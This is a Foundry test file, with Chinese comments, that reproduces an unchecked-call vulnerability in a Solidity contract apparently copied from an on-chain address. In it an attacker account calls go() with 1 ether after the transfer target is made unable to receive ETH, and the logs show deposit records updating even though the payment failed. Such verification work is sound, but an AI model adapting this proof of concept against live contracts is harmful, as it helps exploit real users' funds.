// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xf29ebe930a539a60279ace72c707cba851a57707.sol";

contract BTest is Test {
    B public bContract;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    address target = address(0xC8A60C51967F4022BF9424C337e9c6F0bD220E1C);

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.deal(attacker, 1 ether);
        
        vm.prank(owner);
        bContract = new B();
    }

    function testUncheckedCallVulnerability() public {
        // 记录初始状态
        console.log("--- BEFORE-Trigger ---");
        uint256 contractBalanceBefore = address(bContract).balance;
        uint256 ownerBalanceBefore = owner.balance;
        uint256 totalDepositsBefore = bContract.totalDeposits();
        uint256 userDepositsBefore = bContract.userDeposits(attacker);
        uint256 totalWithdrawalsBefore = bContract.totalWithdrawals();
        
        console.log("Contract ETH balance (before):    ", contractBalanceBefore);
        console.log("Owner ETH balance (before):       ", ownerBalanceBefore);
        console.log("Total Deposits (before):          ", totalDepositsBefore);
        console.log("Attacker Deposits (before):       ", userDepositsBefore);
        console.log("Total Withdrawals (before):       ", totalWithdrawalsBefore);

        // 设置目标合约为无法接收ETH
        vm.etch(target, hex"00");
        
        // 执行漏洞利用操作
        console.log("");
        console.log("--- Trigger: Attacker call go() ---");
        vm.prank(attacker);
        bContract.go{value: 1 ether}();

        // 记录攻击后状态
        console.log("");
        console.log("--- AFTER-Trigger ---");
        uint256 contractBalanceAfter = address(bContract).balance;
        uint256 ownerBalanceAfter = owner.balance;
        uint256 totalDepositsAfter = bContract.totalDeposits();
        uint256 userDepositsAfter = bContract.userDeposits(attacker);
        uint256 totalWithdrawalsAfter = bContract.totalWithdrawals();
        
        console.log("Contract ETH balance (after):     ", contractBalanceAfter);
        console.log("Owner ETH balance (after):        ", ownerBalanceAfter);
        console.log("Total Deposits (after):           ", totalDepositsAfter);
        console.log("Attacker Deposits (after):        ", userDepositsAfter);
        console.log("Total Withdrawals (after):        ", totalWithdrawalsAfter);

        // 计算状态变化
        console.log("");
        uint256 contractBalanceDiff = contractBalanceAfter - contractBalanceBefore;
        uint256 totalDepositsDiff = totalDepositsAfter - totalDepositsBefore;
        uint256 userDepositsDiff = userDepositsAfter - userDepositsBefore;
        uint256 totalWithdrawalsDiff = totalWithdrawalsAfter - totalWithdrawalsBefore;
        uint256 ownerBalanceDiff = ownerBalanceAfter - ownerBalanceBefore;
        
        console.log("--- STATE CHANGES ---");
        console.log("Contract balance delta: %d", contractBalanceDiff);
        console.log("Total deposits delta:   %d", totalDepositsDiff);
        console.log("User deposits delta:    %d", userDepositsDiff);
        console.log("Withdrawals delta:      %d", totalWithdrawalsDiff);
        console.log("Owner balance delta:    %d", ownerBalanceDiff);

        // 原始PoC的断言保持不变
        console.log("");
        console.log("--- Original Assertions ---");
        assertEq(bContract.totalDeposits(), 1 ether);
        assertEq(bContract.userDeposits(attacker), 1 ether);
        assertGt(owner.balance, 0);

        // 漏洞验证逻辑：状态被增加但提款未发生
        bool depositStateUpdated = (totalDepositsDiff == 1 ether && userDepositsDiff == 1 ether);
        bool withdrawalsNotProcessed = (totalWithdrawalsDiff == 0 && contractBalanceDiff == 1 ether);
        bool ownerNotInvolved = (ownerBalanceDiff == 0);
        
        console.log("");
        console.log("--- VULNERABILITY CHECK ---");
        console.log("Deposit state updated despite failed transfer: %s", depositStateUpdated ? "YES" : "NO");
        console.log("Contract balance increased (reverted tx expected): %s", withdrawalsNotProcessed ? "YES" : "NO");
        console.log("Owner balance unchanged as expected:              %s", ownerNotInvolved ? "YES" : "NO");

        // 最终漏洞存在性判断
        if (depositStateUpdated && withdrawalsNotProcessed && ownerNotInvolved) {
            console.log("Vulnerability Exists: State was updated despite failed ETH transfer");
        } else {
            console.log("Vulnerability not Exist: State changes doesn't show exploit conditions");
        }
    }
}